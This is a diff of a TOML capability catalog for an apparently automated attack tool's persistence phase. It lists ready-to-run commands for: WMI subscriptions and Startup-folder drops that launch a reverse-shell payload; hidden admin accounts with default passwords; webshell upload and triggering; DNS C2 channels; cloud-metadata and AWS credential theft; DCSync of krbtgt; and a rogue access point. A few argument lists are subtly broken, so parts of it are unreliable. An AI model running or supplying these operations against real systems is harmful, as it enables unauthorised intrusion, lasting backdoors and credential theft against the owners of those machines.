+id = 'persistence.wmi-subscription'
+phase = 'persistence'
+label = 'WMI SUBSCRIPTION'
+summary = 'Install WMI event subscription persistence on Windows hosts'
+inputs = [
+  { key = 'rhost', type = 'target', required = true },
+  { key = 'username', type = 'username', required = true },
+  { key = 'password', type = 'password', required = true },
+  { key = 'payload', type = 'file', required = false, default = 'C:\\Windows\\Temp\\rev.exe' },
+]
+[[capability.provider]]
+binary = 'impacket-wmiexec'
+[[capability.provider.operation]]
+name = 'Filter Create'
+args = ['{rhost}/{username}:{password}', 'powershell -c $f=Set-WmiInstance -Class __EventFilter -Namespace root\\subscription -Arguments @{Name="TSecFilter";EventNameSpace="root\\cimv2";QueryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'"}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-wmiexec'
+[[capability.provider.operation]]
+name = 'Consumer Create Cmd'
+args = ['{rhost}/{username}:{password}', 'powershell -c Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{Name="TSecConsumer";CommandLineTemplate="{payload}"}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-wmiexec'
+[[capability.provider.operation]]
+name = 'Binding Create'
+args = ['{rhost}/{username}:{password}', 'powershell -c Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{Filter="TSecFilter";Consumer="TSecConsumer"}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-wmiexec'
+[[capability.provider.operation]]
+name = 'Subscription Enum'
+args = ['{rhost}/{username}:{password}', 'powershell -c Get-WmiObject -Namespace root\\subscription -Class __EventFilter']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-wmiexec'
+[[capability.provider.operation]]
+name = 'Consumer Enum'
+args = ['{rhost}/{username}:{password}', 'powershell -c Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-wmiexec'
+[[capability.provider.operation]]
+name = 'Binding Enum'
+args = ['{rhost}/{username}:{password}', 'powershell -c Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-wmiexec'
+[[capability.provider.operation]]
+name = 'Filter Teardown'
+args = ['{rhost}/{username}:{password}', 'powershell -c Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter "Name=\'TSecFilter\'" | Remove-WmiObject']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-wmiexec'
+[[capability.provider.operation]]
+name = 'Consumer Teardown'
+args = ['{rhost}/{username}:{password}', 'powershell -c Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter "Name=\'TSecConsumer\'" | Remove-WmiObject']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'evil-winrm'
+[[capability.provider.operation]]
+name = 'WinRM Sub Enum'
+args = ['-i', '{rhost}', '-u', '{username}', '-p', '{password}', '-e', 'powershell -c Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Post Install Exec Check'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-x', 'whoami']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'WMI Cred Verify'
+args = ['wmi', '{rhost}', '-u', '{username}', '-p', '{password}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'crackmapexec'
+[[capability.provider.operation]]
+name = 'Compat Exec Verify'
+args = ['wmi', '{rhost}', '-u', '{username}', '-p', '{password}', '-x', 'hostname']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'persistence.startup-folder'
+phase = 'persistence'
+label = 'STARTUP FOLDER'
+summary = 'Drop persistence payloads into startup and logon script locations'
+inputs = [
+  { key = 'rhost', type = 'target', required = true },
+  { key = 'username', type = 'username', required = true },
+  { key = 'password', type = 'password', required = true },
+  { key = 'payload', type = 'file', required = false, default = 'rev.exe' },
+]
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Startup Folder Drop'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '--put-file', '{payload}__/\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.exe']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'All Users Startup Drop'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '--put-file', '{payload}__/\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\update.exe']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'smbclient'
+[[capability.provider.operation]]
+name = 'Startup Drop Verify'
+args = ['//{rhost}/c$', '-U', '{username}%{password}', '-c', 'ls "\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-wmiexec'
+[[capability.provider.operation]]
+name = 'Startup Dir Shell Enum'
+args = ['{rhost}/{username}:{password}', 'dir "C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-wmiexec'
+[[capability.provider.operation]]
+name = 'Logon Script GPO Check'
+args = ['{rhost}/{username}:{password}', 'reg query "HKCU\\Environment" /v UserInitMprLogonScript']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-wmiexec'
+[[capability.provider.operation]]
+name = 'Logon Script Set'
+args = ['{rhost}/{username}:{password}', 'reg add "HKCU\\Environment" /v UserInitMprLogonScript /t REG_SZ /d {payload} /f']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-wmiexec'
+[[capability.provider.operation]]
+name = 'Startup Process Verify'
+args = ['{rhost}/{username}:{password}', 'wmic process get name,commandline']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Startup File Readback'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '--get-file', "\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.exe__tmp_update.exe"]
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Startup Teardown'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'reg', '-o', 'ACTION=delete,KEY=HKCU\\Environment,VALUE=UserInitMprLogonScript']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'evil-winrm'
+[[capability.provider.operation]]
+name = 'WinRM Startup Verify'
+args = ['-i', '{rhost}', '-u', '{username}', '-p', '{password}', '-e', 'dir "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"']
+output = 'lines'
+network = true
 [[capability.provider]]
 binary = 'sha256sum'
 [[capability.provider.operation]]
-name = 'Baseline Verify'
-args = ['--quiet', '-c', 'baseline.sha256']
+name = 'Payload Integrity Check'
+args = ['{payload}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'file'
+[[capability.provider.operation]]
+name = 'Payload Format Verify'
+args = ['{payload}']
 output = 'lines'
 network = false
 
 [[capability]]
-id = 'persistence.boot-hooking'
+id = 'persistence.service-persistence-linux'
 phase = 'persistence'
-label = 'BOOT HOOKING'
-summary = 'Hook boot and init processes for pre-launch execution'
+label = 'SERVICE PERSISTENCE LINUX'
+summary = 'Backdoor existing services and install replacement daemons'
 inputs = [
   { key = 'payload', type = 'file', required = true },
+  { key = 'name', type = 'text', required = false, default = 'tsupdd' },
 ]
 [[capability.provider]]
-binary = 'update-grub'
+binary = 'cp'
 [[capability.provider.operation]]
-name = 'GRUB Update'
-args = ['-o', '/boot/grub/grub.cfg']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'update-initramfs'
-[[capability.provider.operation]]
-name = 'Initramfs Update'
-args = ['-u', '-k', 'all']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'bcdedit'
-[[capability.provider.operation]]
-name = 'Recovery Off'
-args = ['/set', 'recoveryenabled', 'No']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'efibootmgr'
-[[capability.provider.operation]]
-name = 'Boot Order'
-args = ['-v']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'tee'
-[[capability.provider.operation]]
-name = 'RC Local Hook'
-args = ['-a', '/etc/rc.local']
-output = 'lines'
-network = false
-
-[[capability]]
-id = 'persistence.library-hooks'
-phase = 'persistence'
-label = 'LIBRARY HOOKS'
-summary = 'Persist through shared library and kernel module hooks'
-inputs = [
-  { key = 'module', type = 'file', required = true },
-]
-[[capability.provider]]
-binary = 'tee'
-[[capability.provider.operation]]
-name = 'Preload Hook'
-args = ['-a', '/etc/ld.so.preload']
-output = 'lines'
-network = false
-
-[[capability.provider.operation]]
-name = 'Ld Config Hook'
-args = ['-a', '/etc/ld.so.conf.d/custom.conf']
-output = 'lines'
-network = false
-
-[[capability.provider.operation]]
-name = 'PAM Hook'
-args = ['-a', '/etc/pam.d/common-auth']
+name = 'Init Script Install'
+args = ['{payload}', '/etc/init.d/{name}']
 output = 'lines'
 network = false
 [[capability.provider]]
-binary = 'insmod'
+binary = 'update-rc.d'
 [[capability.provider.operation]]
-name = 'Module Load'
-args = ['{module}']
+name = 'Init Defaults Enable'
+args = ['{name}', 'defaults']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
-binary = 'modprobe'
+binary = 'chkconfig'
 [[capability.provider.operation]]
-name = 'Module Probe'
-args = ['-v', 'custom_module']
+name = 'Chkconfig Enable'
+args = ['--add', '{name}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
-binary = 'ldconfig'
+binary = 'systemctl'
 [[capability.provider.operation]]
-name = 'Linker Refresh'
-args = ['-p']
+name = 'Service Enable Now'
+args = ['enable', '--now', '{name}.service']
 output = 'lines'
-network = true
-
-[[capability]]
-id = 'persistence.cloud-backdoor'
-phase = 'persistence'
-label = 'CLOUD BACKDOOR'
-summary = 'Create durable cloud identity and role access'
-inputs = [
-  { key = 'provider', type = 'list', required = false, default = 'aws' },
-  { key = 'user', type = 'text', required = false, default = 'target-admin' },
-]
+network = false
 [[capability.provider]]
-binary = 'aws'
+binary = 'systemctl'
 [[capability.provider.operation]]
-name = 'Access Key'
-args = ['iam', 'create-access-key', '--user-name', '{user}']
+name = 'Service Status Verify'
+args = ['status', '{name}.service', '--no-pager']
 output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Policy Attach'
-args = ['iam', 'attach-user-policy', '--user-name', '{user}', '--policy-arn', 'arn:aws:iam::aws:policy/AdministratorAccess']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Role Create'
-args = ['iam', 'create-role', '--role-name', 'CrossAccount', '--assume-role-policy-document', 'trust.json']
-output = 'lines'
-network = true
+network = false
 [[capability.provider]]
-binary = 'az'
+binary = 'ls'
 [[capability.provider.operation]]
-name = 'Role Assign'
-args = ['role', 'assignment', 'create', '--assignee', 'sp-uuid', '--role', 'Owner']
+name = 'RC Dir Inventory'
+args = ['-la', '/etc/rc.local', '/etc/init.d/']
 output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Credential Reset'
-args = ['ad', 'app', 'credential', 'reset', '--id', 'app-uuid', '--append']
-output = 'lines'
-network = true
+network = false
 [[capability.provider]]
-binary = 'gcloud'
+binary = 'cat'
 [[capability.provider.operation]]
-name = 'Owner Grant'
-args = ['projects', 'add-iam-policy-binding', 'target-project', '--member=serviceAccount:ext@ext.iam.gserviceaccount.com', '--role=roles/owner']
+name = 'Rc Local Dump'
+args = ['/etc/rc.local']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
-binary = 'kubectl'
+binary = 'grep'
 [[capability.provider.operation]]
-name = 'Daemonset Apply'
-args = ['apply', '-f', 'daemonset.yaml']
+name = 'Xinetd Config Check'
+args = ['-r', '{name}', '/etc/xinetd.d/', '2>/dev/null']
 output = 'lines'
-network = true
-
-[[capability]]
-id = 'persistence.foothold-validation'
-phase = 'persistence'
-label = 'FOOTHOLD VALIDATION'
-summary = 'Verify persistence channels remain alive and stable'
-inputs = [
-  { key = 'port', type = 'port', required = false, default = '443' },
-]
+network = false
+[[capability.provider]]
+binary = 'ps'
+[[capability.provider.operation]]
+name = 'Daemon Process Verify'
+args = ['aux']
+output = 'lines'
+network = false
 [[capability.provider]]
 binary = 'ss'
 [[capability.provider.operation]]
-name = 'Listener Check'
-args = ['-tulpn']
+name = 'Listener Verify'
+args = ['-tlnp']
 output = 'lines'
-network = true
-
+network = false
+[[capability.provider]]
+binary = 'journalctl'
 [[capability.provider.operation]]
-name = 'Established Check'
-args = ['-tapn', 'state', 'established']
+name = 'Service Log Verify'
+args = ['-u', '{name}.service', '-n', '30', '--no-pager']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'stat'
+[[capability.provider.operation]]
+name = 'Init Perms Verify'
+args = ['-c', '%a %U %G %n', '/etc/init.d/{name}']
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'persistence.webshell-persistence'
+phase = 'persistence'
+label = 'WEBSHELL PERSISTENCE'
+summary = 'Deploy persistent webshells and verify access over time'
+inputs = [
+  { key = 'url', type = 'url', required = true },
+  { key = 'path', type = 'file', required = false, default = 'shell.php' },
+  { key = 'pass', type = 'password', required = false, default = 'tsecpass' },
+]
+[[capability.provider]]
+binary = 'weevely'
+[[capability.provider.operation]]
+name = 'Shell Generate'
+args = ['generate', '{pass}', '{path}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'weevely'
+[[capability.provider.operation]]
+name = 'Shell Session'
+args = ['{url}/uploads/{path}', '{pass}']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'curl'
 [[capability.provider.operation]]
-name = 'C2 Health'
-args = ['-I', '-s', '--connect-timeout', '5', 'https://c2.example.com/health']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Egress Check'
-args = ['-s', '-x', 'socks5h://127.0.0.1:1080', 'http://ifconfig.me']
+name = 'Shell Upload'
+args = ['-sk', '-F', 'file=@{path}', '{url}/upload.php']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'systemctl'
+binary = 'curl'
 [[capability.provider.operation]]
-name = 'Service Health'
-args = ['status', 'sysupdate.service', '--no-pager']
+name = 'Shell Trigger Verify'
+args = ['-sk', '{url}/uploads/{path}?cmd=whoami']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'crontab'
+binary = 'curl'
 [[capability.provider.operation]]
-name = 'Cron Health'
-args = ['-l']
+name = 'Shell Header Verify'
+args = ['-skI', '{url}/uploads/{path}']
 output = 'lines'
 network = true
-
-[[capability]]
-id = 'persistence.cleanup-playbook'
-phase = 'persistence'
-label = 'CLEANUP PLAYBOOK'
-summary = 'Catalog deployed artifacts and generate rollback steps'
-inputs = [
-  { key = 'path', type = 'path', required = true },
-]
 [[capability.provider]]
-binary = 'sha256sum'
+binary = 'httpx'
 [[capability.provider.operation]]
-name = 'Artifact Catalog'
+name = 'Shell Path Check'
+args = ['-u', '{url}/uploads/{path}', '-sc', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'ASPX Shell Trigger'
+args = ['-sk', '{url}/uploads/shell.aspx?cmd=whoami']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'JSP Shell Trigger'
+args = ['-sk', '{url}/uploads/shell.jsp?cmd=id']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'Webshell Detection Sweep'
+args = ['-u', '{url}', '-tags', 'webshell,backdoor', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'file'
+[[capability.provider.operation]]
+name = 'Shell Artifact Verify'
 args = ['{path}']
 output = 'lines'
 network = false
 [[capability.provider]]
-binary = 'diff'
+binary = 'sha256sum'
 [[capability.provider.operation]]
-name = 'Config Diff'
-args = ['-u', '{path}.bak', '{path}']
+name = 'Shell Fingerprint'
+args = ['{path}']
 output = 'lines'
 network = false
 [[capability.provider]]
-binary = 'debsums'
+binary = 'grep'
 [[capability.provider.operation]]
-name = 'Integrity Compare'
-args = ['-e', '-a']
+name = 'Shell Source Pattern Scan'
+args = ['-rE', 'eval|system|passthru|exec', '{path}']
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'persistence.dns-persistence'
+phase = 'persistence'
+label = 'DNS PERSISTENCE'
+summary = 'Maintain DNS-based callback channel for persistent access'
+inputs = [
+  { key = 'domain', type = 'domain', required = true },
+  { key = 'lhost', type = 'target', required = true },
+]
+[[capability.provider]]
+binary = 'dnscat2'
+[[capability.provider.operation]]
+name = 'Server Start'
+args = ['{domain}']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'bash'
+binary = 'iodined'
 [[capability.provider.operation]]
-name = 'Rollback Script'
-args = ['-c', 'cat cleanup.sh']
+name = 'Tunnel Server Start'
+args = ['-f', '-P', 'tsec', '10.0.0.1', 't.{domain}']
 output = 'lines'
 network = true
 [[capability.provider]]
-binary = 'git'
+binary = 'dig'
 [[capability.provider.operation]]
-name = 'Ledger Commit'
-args = ['init']
+name = 'NS Delegation Verify'
+args = ['+short', 't.{domain}', 'NS']
 output = 'lines'
 network = true
+[[capability.provider]]
+binary = 'dig'
+[[capability.provider.operation]]
+name = 'TXT Beacon Verify'
+args = ['@{lhost}', 'beacon.t.{domain}', 'TXT']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'dig'
+[[capability.provider.operation]]
+name = 'CNAME Beacon Verify'
+args = ['@{lhost}', 'beacon.t.{domain}', 'CNAME']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'sliver'
+[[capability.provider.operation]]
+name = 'DNS Listener Restart'
+args = ['dns', '--lport', '53', '--domains', 't.{domain}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'sliver'
+[[capability.provider.operation]]
+name = 'Session Liveness Check'
+args = ['sessions']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ss'
+[[capability.provider.operation]]
+name = 'Port 53 Bind Verify'
+args = ['-ulnp']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'tcpdump'
+[[capability.provider.operation]]
+name = 'DNS Beacon Capture'
+args = ['-i', 'eth0', '-c', '20', '-nn', 'port', '53']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'tshark'
+[[capability.provider.operation]]
+name = 'Beacon Traffic Filter'
+args = ['-i', 'eth0', '-Y', 'dns.qry.name contains "t.{domain}"', '-a', 'duration:30']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'nslookup'
+[[capability.provider.operation]]
+name = 'Resolver Round Trip'
+args = ['beacon.t.{domain}', '{lhost}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'whois'
+[[capability.provider.operation]]
+name = 'Domain Expiry Check'
+args = ['{domain}']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'persistence.cloud-persistence'
+phase = 'persistence'
+label = 'CLOUD PERSISTENCE'
+summary = 'Probe cloud control-plane persistence vectors keylessly'
+inputs = [
+  { key = 'bucket', type = 'text', required = true },
+  { key = 'region', type = 'text', required = false, default = 'us-east-1' },
+]
+[[capability.provider]]
+binary = 'aws'
+[[capability.provider.operation]]
+name = 'S3 Anon Bucket List'
+args = ['s3', 'ls', 's3://{bucket}', '--no-sign-request', '--region', '{region}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'aws'
+[[capability.provider.operation]]
+name = 'S3 Anon Object Probe'
+args = ['s3', 'ls', 's3://{bucket}/backups/', '--no-sign-request', '--region', '{region}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'S3 Website Probe'
+args = ['-sk', '-o', '/dev/null', '-w', '%{http_code}', 'http://{bucket}.s3-website-{region}.amazonaws.com/']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'S3 REST Probe'
+args = ['-sk', '-o', '/dev/null', '-w', '%{http_code}', 'https://{bucket}.s3.amazonaws.com/']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Azure Blob Probe'
+args = ['-sk', '-o', '/dev/null', '-w', '%{http_code}', 'https://{bucket}.blob.core.windows.net/']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'GCS Probe'
+args = ['-sk', '-o', '/dev/null', '-w', '%{http_code}', 'https://{bucket}.storage.googleapis.com/']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'IMDS Cred Fetch'
+args = ['-sk', '--connect-timeout', '3', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'IMDS Role Cred Pull'
+args = ['-sk', '--connect-timeout', '3', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/tsrole']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'IMDSv2 Token Request'
+args = ['-sk', '-X', 'PUT', '-H', 'X-aws-ec2-metadata-token-ttl-seconds: 300', 'http://169.254.169.254/latest/api/token']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'AWS Creds Readback'
+args = ['/root/.aws/credentials']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'AWS Config Readback'
+args = ['/root/.aws/config']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'env'
+[[capability.provider.operation]]
+name = 'Cloud Env Snapshot'
+args = []
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'persistence.backdoor-user'
+phase = 'persistence'
+label = 'BACKDOOR USER'
+summary = 'Create and verify hidden local accounts for persistent access'
+inputs = [
+  { key = 'rhost', type = 'target', required = true },
+  { key = 'username', type = 'username', required = true },
+  { key = 'password', type = 'password', required = true },
+  { key = 'backdoor-user', type = 'text', required = false, default = 'svcupdate' },
+  { key = 'backdoor-pass', type = 'password', required = false, default = 'Tsec!2024x' },
+]
+[[capability.provider]]
+binary = 'impacket-wmiexec'
+[[capability.provider.operation]]
+name = 'Windows User Create'
+args = ['{rhost}/{username}:{password}', 'net user {backdoor-user} {backdoor-pass} /add']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-wmiexec'
+[[capability.provider.operation]]
+name = 'Admin Group Add'
+args = ['{rhost}/{username}:{password}', 'net localgroup administrators {backdoor-user} /add']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-wmiexec'
+[[capability.provider.operation]]
+name = 'User Enum Verify'
+args = ['{rhost}/{username}:{password}', 'net user {backdoor-user}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Backdoor Cred Test'
+args = ['smb', '{rhost}', '-u', '{backdoor-user}', '-p', '{backdoor-pass}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-wmiexec'
+[[capability.provider.operation]]
+name = 'User Delete Teardown'
+args = ['{rhost}/{username}:{password}', 'net user {backdoor-user} /delete']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'useradd'
+[[capability.provider.operation]]
+name = 'Linux User Create'
+args = ['-m', '-s', '/bin/bash', '{backdoor-user}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'chpasswd'
+[[capability.provider.operation]]
+name = 'Linux Password Set'
+args = ['echo', '{backdoor-user}:{backdoor-pass}', '|', 'chpasswd']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'usermod'
+[[capability.provider.operation]]
+name = 'Sudo Group Add'
+args = ['-aG', 'sudo', '{backdoor-user}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'id'
+[[capability.provider.operation]]
+name = 'Linux User Verify'
+args = ['{backdoor-user}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ssh'
+[[capability.provider.operation]]
+name = 'Linux Backdoor Login Test'
+args = ['-o', 'StrictHostKeyChecking=no', '{backdoor-user}@{rhost}', 'id']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Passwd Entry Verify'
+args = ['{backdoor-user}', '/etc/passwd']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'userdel'
+[[capability.provider.operation]]
+name = 'Linux User Teardown'
+args = ['-r', '{backdoor-user}']
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'persistence.ldaps-persistence'
+phase = 'persistence'
+label = 'LDAPS PERSISTENCE'
+summary = 'Plant AD objects and adminSDHolder-style persistence'
+inputs = [
+  { key = 'rhost', type = 'target', required = true },
+  { key = 'domain', type = 'domain', required = true },
+  { key = 'username', type = 'username', required = true },
+  { key = 'password', type = 'password', required = true },
+]
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Domain Admin Enum'
+args = ['ldap', '{rhost}', '-u', '{username}', '-p', '{password}', '--admin-counts']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'GPO Enum'
+args = ['ldap', '{rhost}', '-u', '{username}', '-p', '{password}', '--gpo']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'OU Enum'
+args = ['ldap', '{rhost}', '-u', '{username}', '-p', '{password}', '--ou']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'ldapsearch'
+[[capability.provider.operation]]
+name = 'AdminSDHolder Dump'
+args = ['-x', '-H', 'ldap://{rhost}', '-D', '{username}@{domain}', '-w', '{password}', '-b', 'CN=AdminSDHolder,CN=System,DC={domain}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'ldapsearch'
+[[capability.provider.operation]]
+name = 'DA Group Members Pull'
+args = ['-x', '-H', 'ldap://{rhost}', '-D', '{username}@{domain}', '-w', '{password}', '-b', 'DC={domain}', '(&(objectClass=group)(cn=Domain Admins))']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-net'
+[[capability.provider.operation]]
+name = 'Add To Group Probe'
+args = ['{domain}/{username}:{password}@{rhost}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'User Description Check'
+args = ['ldap', '{rhost}', '-u', '{username}', '-p', '{password}', '--users']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-getTGT'
+[[capability.provider.operation]]
+name = 'Persistent TGT Pull'
+args = ['{domain}/{username}:{password}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'klist'
+[[capability.provider.operation]]
+name = 'Ticket Cache Verify'
+args = []
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'DC Sync Probe'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'drsuapi']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-secretsdump'
+[[capability.provider.operation]]
+name = 'DC Sync Exec'
+args = ['{domain}/{username}:{password}@{rhost}', '-just-dc-user', 'krbtgt']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'ldapsearch'
+[[capability.provider.operation]]
+name = 'Trust Object Pull'
+args = ['-x', '-H', 'ldap://{rhost}', '-D', '{username}@{domain}', '-w', '{password}', '-b', 'DC={domain}', '(objectClass=trustedDomain)']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'persistence.wireless-rogue-ap'
+phase = 'persistence'
+label = 'WIRELESS ROGUE AP'
+summary = 'Establish and monitor rogue access point footholds'
+inputs = [
+  { key = 'iface', type = 'text', required = false, default = 'wlan0' },
+  { key = 'ssid', type = 'text', required = false, default = 'TSec-Test' },
+  { key = 'channel', type = 'port', required = false, default = '6' },
+]
+[[capability.provider]]
+binary = 'airbase-ng'
+[[capability.provider.operation]]
+name = 'Rogue AP Start'
+args = ['-e', '{ssid}', '-c', '{channel}', '{iface}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'hostapd'
+[[capability.provider.operation]]
+name = 'Hostapd Start'
+args = ['-B', '/etc/hostapd/hostapd.conf']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'dnsmasq'
+[[capability.provider.operation]]
+name = 'DHCP Service Start'
+args = ['--conf-file=/etc/dnsmasq.conf', '--no-daemon']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'iw'
+[[capability.provider.operation]]
+name = 'Monitor Mode Set'
+args = ['dev', '{iface}', 'set', 'monitor', 'managed']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'airmon-ng'
+[[capability.provider.operation]]
+name = 'Monitor Start Check'
+args = ['start', '{iface}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'airodump-ng'
+[[capability.provider.operation]]
+name = 'Client Connect Monitor'
+args = ['{iface}mon', '--write', '/tmp/rogue_capture']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'iw'
